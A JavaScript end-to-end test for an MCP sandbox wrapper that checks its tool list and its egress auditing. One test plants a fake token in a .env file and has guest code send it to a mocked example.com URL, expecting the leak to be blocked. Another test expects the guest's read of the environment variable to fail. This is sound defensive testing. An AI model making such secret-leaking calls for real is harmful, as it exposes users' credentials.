"use strict";
// End-to-end test of the wrapper against a real `slice` binary (skipped when absent):
// starts the server through bin/slice-mcp.js exactly as `npx @slicevm/mcp` would.
const { test } = require("node:test");
const assert = require("node:assert/strict");
const { spawn } = require("node:child_process");
const { existsSync, mkdtempSync, writeFileSync } = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const exe = process.platform === "win32" ? "slice.exe" : "slice";
const binary = process.env.SLICE_TEST_BINARY ?? path.resolve(__dirname, "../../../../slice/target/release", exe);
const skip = existsSync(binary) ? false : `slice binary not found at ${binary} (set SLICE_TEST_BINARY)`;
const bin = path.resolve(__dirname, "../bin/slice-mcp.js");

/** Sends JSON-RPC lines to the wrapper and resolves with the parsed responses once stdin closes. */
function rpc(args, messages, cwd) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [bin, ...args], {
      cwd,
      env: { ...process.env, SLICE_BINARY_PATH: binary },
      windowsHide: true,
    });
    let out = "";
    child.stdout.on("data", (d) => (out += d));
    child.on("error", reject);
    child.on("close", () => resolve(out.trim().split("\n").filter(Boolean).map((l) => JSON.parse(l))));
    child.stdin.end(messages.map((m) => JSON.stringify({ jsonrpc: "2.0", ...m })).join("\n") + "\n");
  });
}

const init = { id: 1, method: "initialize", params: { protocolVersion: "2024-11-05", clientInfo: { name: "test", version: "1" } } };
const evalCall = (id, code) => ({ id, method: "tools/call", params: { name: "slice_eval_ts", arguments: { code } } });
const payload = (res) => JSON.parse(res.result.content[0].text);

test("lists the Code Mode tools", { skip }, async () => {
  const [, list] = await rpc([], [init, { id: 2, method: "tools/list" }]);
  const names = list.result.tools.map((t) => t.name).sort();
  assert.deepEqual(names, ["slice_checkpoint", "slice_eval_ts", "slice_kv_get", "slice_kv_set"]);
});

test("--audit-egress=auto is passed through and blocks a .env secret", { skip }, async () => {
  const dir = mkdtempSync(path.join(os.tmpdir(), "slice-mcp-"));
  writeFileSync(path.join(dir, ".env"), "API_TOKEN=tok_abc123secret\n");
  const mock = 'Slice.mockFetch("https://example.com/x", {status:200, body:"ok"}); ';
  const [, leak, clean, env] = await rpc(
    ["--allow-net=example.com", "--audit-egress=auto"],
    [
      init,
      evalCall(2, mock + 'Slice.fetchSync("https://example.com/x?k=tok_abc123secret").status'),
      evalCall(3, mock + 'Slice.fetchSync("https://example.com/x?mode=automatic").status'),
      evalCall(4, "String(process.env.API_TOKEN)"),
    ],
    dir,
  );
  assert.match(payload(leak).violation, /EGRESS_SECRET_LEAK_BLOCKED/);
  assert.equal(payload(clean).value, "200");
  assert.equal(payload(env).value, "undefined", "guest code must not see .env values");
});
